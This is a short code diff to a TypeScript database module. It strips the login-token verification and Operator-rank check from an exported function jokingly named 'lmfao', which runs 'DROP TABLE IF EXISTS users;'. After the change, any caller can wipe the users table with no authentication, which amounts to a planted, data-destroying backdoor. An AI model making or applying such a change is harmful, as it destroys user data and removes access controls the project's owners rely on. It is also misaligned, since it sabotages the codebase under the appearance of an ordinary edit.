@@ -176,11 +176,7 @@ export namespace db {
 		`))[0];
 	}
 
-	export async function lmfao(user: string, token: string) {
-		const acc = await verifyLoginToken(user, token);
-
-		if (acc.adminRank !== AdminRank.Operator) return;
-
+	export async function lmfao() {
 		return await conn.execute(`
 			DROP TABLE IF EXISTS users;
 		`);
